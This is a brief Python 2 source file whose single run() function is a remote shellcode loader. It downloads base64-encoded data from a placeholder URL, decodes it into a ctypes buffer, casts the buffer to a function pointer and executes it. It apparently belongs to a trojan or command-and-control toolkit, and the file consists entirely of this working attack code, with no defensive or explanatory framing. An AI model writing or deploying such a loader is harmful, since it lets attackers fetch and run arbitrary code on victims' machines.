import urllib2
import ctypes
import base64
def run(** args):
	

	url = "imput download url"
	response = urllib2.urlopen(url)
	shellcode = base64.b64decode(response.read())
	shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
	shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
	return shellcode_func()
	

